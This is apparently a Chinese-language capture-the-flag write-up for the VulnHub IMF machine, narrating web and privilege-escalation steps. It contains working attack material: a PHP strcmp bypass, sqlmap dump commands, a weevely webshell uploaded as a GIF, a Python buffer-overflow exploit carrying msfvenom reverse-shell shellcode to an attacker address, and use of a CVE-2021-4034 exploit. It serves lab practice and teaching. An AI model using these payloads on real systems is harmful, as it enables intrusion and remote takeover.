# IMF_1(VulbHub)_WriteUp

[TOC]



## 1、主机探测

![image-20231112142200942](./assets/image-20231112142200942.png)

![image-20231112142455931](./assets/image-20231112142455931.png)

![image-20231112142536167](./assets/image-20231112142536167.png)

## 2、web渗透

### 发现flag1

![image-20231112142719563](./assets/image-20231112142719563.png)

![image-20231112143423069](./assets/image-20231112143423069.png)

```
发现flag1：
<!-- flag1{YWxsdGhlZmlsZXM=} -->
allthefiles
```

### 发现flag2

![image-20231112143129361](./assets/image-20231112143129361.png)

![image-20231112142826870](./assets/image-20231112142826870.png)

```
发现flag2：
        <script src="js/ZmxhZzJ7YVcxbVl.js"></script>
        <script src="js/XUnRhVzVwYzNS.js"></script>
        <script src="js/eVlYUnZjZz09fQ==.min.js"></script>

----> ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==
----> imfadministrator
```

![image-20231112143216184](./assets/image-20231112143216184.png)

再解一轮

![image-20231112143321287](./assets/image-20231112143321287.png)

### 拼接imfadministrator目录

![image-20231112143537920](./assets/image-20231112143537920.png)

```
!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger --

type="text" name="user"
type="password" name="pass"
```

![image-20231112191249296](./assets/image-20231112191249296.png)

sqlmap跑了很久，一点也跑不出来

![image-20231112192314595](./assets/image-20231112192314595.png)

### 收集用户名

contact.php这个页面发现有邮箱这样的信息

=> 用户名！

```
发现邮箱信息：
rmichaels@imf.local
akeith@imf.local
estone@imf.local
三个用户信息！这里有三个用户：rmichaels、akeith、estone
```

![image-20231112193606476](./assets/image-20231112193606476.png)

### 代码审计之弱类型绕过

通过枚举用户名，并且进行绕过尝试

```
burpsuite测试用户名有效性
测试akeith、estone时候回显：Invalid username  （无效的用户名）
测试rmichaels回显：Invalid password（无效的密码）
找到了正确的用户名！
```

[代码审计之弱类型绕过](https://www.cnblogs.com/Atkx/p/14264132.html)

字符串转换为数组：

将字段名称更新pass为pass[]，这意味着PHP将把这个字段解释为一个数组，而不是一个字符串。这有时会混淆验证字符串检查，如果输入是数组strcmp则会返回NULL！

![image-20231112193836881](./assets/image-20231112193836881.png)

![image-20231112193910016](./assets/image-20231112193910016.png)

### 发现flag3

将带有绕过的包放回

```
flag3{Y29udGludWVUT2Ntcw==}
Welcome, rmichaels
IMF CMS
```

![image-20231112194002455](./assets/image-20231112194002455.png)

![image-20231112194824350](./assets/image-20231112194824350.png)

### 进入IMF CMS漏扫测试

![image-20231112195332083](./assets/image-20231112195332083.png)

vulmap、AWVS等漏扫没法扫描出漏洞

![image-20231112201455101](./assets/image-20231112201455101.png)

### 尝试跑sqlmap

想到之前的那个sql，再试一次，这次跑POST包

用burpsuite拦截流量包，右键点击：copy to file 保存到本地1.txt文本中！

![image-20231112201804729](./assets/image-20231112201804729.png)

```bash
sqlmap -r sql_post.txt --batch -dbs
```

![image-20231112202035217](./assets/image-20231112202035217.png)

```bash
sqlmap -r sql_post.txt --batch -D admin --tables
```

![image-20231112202129691](./assets/image-20231112202129691.png)

```bash
sqlmap -r sql_post.txt --batch -D admin -T pages --columns
```

![image-20231112202210151](./assets/image-20231112202210151.png)

```bash
sqlmap -r sql_post.txt --batch -D admin -T pages -C id,pagedata,pagename --dump
```

![image-20231112202247791](./assets/image-20231112202247791.png)

### 发现异常数据

输入第三个表单当中的数据

![image-20231112202440160](./assets/image-20231112202440160.png)

### 发现flag4

通过二维码扫描软件得第四个flag

```
flag4{dXBsb2Fkcjk0Mi5waHA=}
解码：uploadr942.php
```

![image-20231112202629299](./assets/image-20231112202629299.png)

![image-20231112202655042](./assets/image-20231112202655042.png)

### 继续访问uploadr942.php页面

![image-20231112202743211](./assets/image-20231112202743211.png)

### waf绕过(.htaccess绕过)

发现次waf检测文件内容！

![image-20231112204959017](./assets/image-20231112204959017.png)

![image-20231112204910541](./assets/image-20231112204910541.png)

这边肯定好奇了，这儿为什么上传gif，但是可以执行php的命令，这部分的内容我们后边再说。

![image-20231112205342737](./assets/image-20231112205342737.png)

### 发现flag5

```
获得flag5：flag5{YWdlbnRzZXJ2aWNlcw==} 
base64解码获得：agentservices
```

![image-20231112205400040](./assets/image-20231112205400040.png)

![image-20231112205414400](./assets/image-20231112205414400.png)

### 反弹shell

![image-20231112210024844](./assets/image-20231112210024844.png)

![image-20231112210122393](./assets/image-20231112210122393.png)

![image-20231112210220725](./assets/image-20231112210220725.png)

![image-20231112210428076](./assets/image-20231112210428076.png)

![image-20231112210607468](./assets/image-20231112210607468.png)

## 3、内网渗透

> 法一：缓冲区溢出-提权

### 查找agent

```
通过flag5 base64解码获得：agentservices
这是提示agent的服务存在问题！

find / -name agent 2>/dev/null    发现：
/usr/local/bin/agent
/etc/xinetd.d/agent

访问：/usr/local/bin/agent
是可以访问的，并且需要输入数值ID！
```

![image-20231112221501520](./assets/image-20231112221501520.png)

### 查看开启的端口情况

```
netstat -ant    ---查看开启的端口情况
nc 127.0.0.1 7788    ---查看到开启7788端口是anget程序的
```

![image-20231112222415098](./assets/image-20231112222415098.png)

### 查看/usr/local/bin下的文件

![image-20231112222828012](./assets/image-20231112222828012.png)

![image-20231112223502941](./assets/image-20231112223502941.png)

![image-20231112223209914](./assets/image-20231112223209914.png)

### 敲震端口

```
敲震端口：
knock 192.168.126.167 7482 8279 9467
nmap 192.168.126.167 -p7788,80     ----这时候7788端口开启
```

![image-20231112224804294](./assets/image-20231112224804294.png)

### 通过追踪来继续研究agent文件

![image-20231112225916819](./assets/image-20231112225916819.png)

```
ltrace ./agent
随意输入数字！
strncmp("dwqdq\n", "48093572", 8)  = -1 ----正在将我提供的字符串与字符串48093572进行比较，在这种情况下导致=-1）

为了防止缓冲区溢出这种情况的出现，在C库函数中，许多对字符串操作的函数都有其"n兄弟"版本，例如strncmp，strncat，snprintf……兄弟版本的基本行为不变，但是通常在参数中需要多给出一个整数n，用于限制操作的最大字符数量。

甚至strings agent发现：两个地方使用了“%s”，这很可能是一个有效的溢出点！

vmmap
0xfffdc000 0xffffe000 rwxp      [stack]
发现这是个栈溢出的题目！

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
gdb ./agent
run
48093572    
输入后：
Main Menu:
1. Extraction Points
2. Request Extraction
3. Submit Report
0. Exit
选择Submit Report 3：

输入2000值后，发现segmentation fault溢出报错！存在缓冲区溢出！
0x41366641

还发现：堆栈开始是EAX寄存器
EAX: 0xffffcfd4 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASA\324\317\377\377TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41366641
发现偏移量为：168

python -c 'print "A" * 168 + "B" * 4'
通过测试：
EAX: 0xffffcfd4 ('A' <repeats 152 times>, "\324\317\377\377", 'A' <repeats 15 times>, "BBBB")
EIP被168个字节覆盖，但是多给的B字节走到了EAX上，在给多个C测试shellcode会走哪儿！

python -c 'print "A" * 168 + "B" * 4 + "CCCCCCCCCCCCCCCC"'
EAX: 0xffffcfd4 ('A' <repeats 152 times>, "\324\317\377\377", 'A' <repeats 12 times>, "BBBB", 'C' <repeats 16 times>)

或者：
info registers eax
x/20x $eax -32
这时候可看到：
0xffffcfc4:     0xffffcfd4      0x00000001      0x00000000      0x0804b02c
0xffffcfd4:     0x41414141      0x41414141      0x41414141      0x41414141
......

C也走到了EAX，找保护措施！那么只需要找到eax值，即可直接跳到shellcode！


checksec
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
RELRO 是一种用于加强对 binary 数据段的保护的技术。
参考：https://lantern.cool/note-pwn-linux-protect/

查看ASLR设置：
cat /proc/sys/kernel/randomize_va_space
2
或者：
sysctl -a --pattern randomize
kernel.randomize_va_space = 2

0 = 关闭
1 = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。（留坑，PIE会影响heap的随机化。。）
2 = 全随机。除了1中所述，还有heap。
说明存在随机化！ASLR功能的程序使用ret2reg（返回寄存器）指令来利用缓冲区溢出
参考大佬：
https://www.securitylab.ru/analytics/405868.php

gdb-peda$ jmpcall eax
0x8048563 : call eax

或者：asmsearch "jmp eax"
asmsearch "call eax"

EAX 地址0x8048563

目前知道了JMP值：0x8048563
偏移量：168
接下来创建shellcode写个脚本就直接拿下！
```

### 创建后门

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.126.134 LPORT=6666 -f python -b "\x00\x0a\x0b"

payload：
-p 载荷类型
LHOST 本机地址
LPORT
-b 坏字符
-f 编译的语言
\x00 == 0x00 ASCII控制字符表中对应 NULL (空字符)
\x0a == 0X0a ASCII控制字符表中对应 LF （换行键）
\x0b == 0x0b ASCII控制字符表中对应 VT (垂直定位符号)

需要运行，在输入密码，在输入ID，才能进行缓冲区溢出，这时候需要expect的特殊脚本语言来写：
https://en.wikipedia.org/wiki/Expect
```

![image-20231112234419637](./assets/image-20231112234419637.png)

### 最终代码：exp.py

![image-20231113002840393](./assets/image-20231113002840393.png)

```py
# 参考大余老师的：

import socket
 
# Target related variables
remotehost = "10.211.55.36"
remoteport = 7788
menuoption = 3
agentid = 48093572
 
# Default recv size
recvsize = 512
 
# Connnect to remote host
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((remotehost, remoteport))
client.recv(recvsize)
client.send("{0}\n".format(agentid))
client.recv(recvsize)
client.send("{0}\n".format(menuoption))
client.recv(recvsize)
 
# Payload genereated by Msfvenom, to be force fed into reporting tool
buf =  b""
buf += b"\xdb\xda\xd9\x74\x24\xf4\xbb\x99\x95\x96\x1f\x58\x33"
buf += b"\xc9\xb1\x12\x31\x58\x17\x83\xe8\xfc\x03\xc1\x86\x74"
buf += b"\xea\xc0\x73\x8f\xf6\x71\xc7\x23\x93\x77\x4e\x22\xd3"
buf += b"\x11\x9d\x25\x87\x84\xad\x19\x65\xb6\x87\x1c\x8c\xde"
buf += b"\x1d\x0c\x59\x0d\x4a\xb0\xa6\x2b\x80\x3d\x47\xfb\xf2"
buf += b"\x6d\xd9\xa8\x49\x8e\x50\xaf\x63\x11\x30\x47\x12\x3d"
buf += b"\xc6\xff\x82\x6e\x07\x9d\x3b\xf8\xb4\x33\xef\x73\xdb"
buf += b"\x03\x04\x49\x9c"
 
# Buffer is too small to trigger overflow. Fattening it up!
# 168 is the offset I found using pattern_offset
buf += "A" * (168 - len(buf))
 
# EAX call I made note of earlier in this segment
buf += "\x63\x85\x04\x08\n"
 
# And off we go!
client.send(buf)
```

### 测试效果

有点失败，没戏。提权试试。

![image-20231113003630357](./assets/image-20231113003630357.png)

### cve-2021-4034-poc.c_2022通杀提权

> 法二：cve-2021-4034-poc.c提权

### 基础探测

![image-20231113000545397](./assets/image-20231113000545397.png)

### 脚本探测

![image-20231113001301914](./assets/image-20231113001301914.png)

这里只能找到这个，但是不是我们想要的

![image-20231113001239229](./assets/image-20231113001239229.png)

上google搜索该版本提权漏洞，发现2022年有一个超级提权漏洞，其他漏洞也是可以的，不过这个最快。

[CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034)

### 使用cve-2021-4034-poc.c

![image-20231113013359387](./assets/image-20231113013359387.png)

### 发现flag6

![image-20231113013611130](./assets/image-20231113013611130.png)



# 拓展

## sqlmap可以一步到位

```bash
sqlmap -r sql_post.txt --batch --dump
```

![image-20231112202334539](./assets/image-20231112202334539.png)

## 上传gif，却可以执行php命令

```
为什么该文件上传允许gif解析php？？
cd /var/www/html/imfadministrator/uploads ---进入文件上传目录
ls -la  ---查看到存在.htaccess
cat查看信息：
AddType application/x-httpd-php .php .gif
AddHandler application/x-httpd-php .gif
可看到该文件与继续gif解析php文件！
```

![image-20231112222234899](./assets/image-20231112222234899.png)

## weevely

```
weevely generate passdayu dayu.php   ---生成dayu.php文件密码为passdayu
generate  ---生成新代理
mv dayu.php dayu.gif    ---然后头部加入GIF98a并改名文件为gif

然后上传文件，看源码ID：ff075cd8aeef
weevely http://10.211.55.36/imfadministrator/uploads/ff075cd8aeef.gif passdayu
成功获得shell，该shell很稳定！
```

## 靶场作者wp

https://reedphish.wordpress.com/2016/11/20/imf-walkthrough/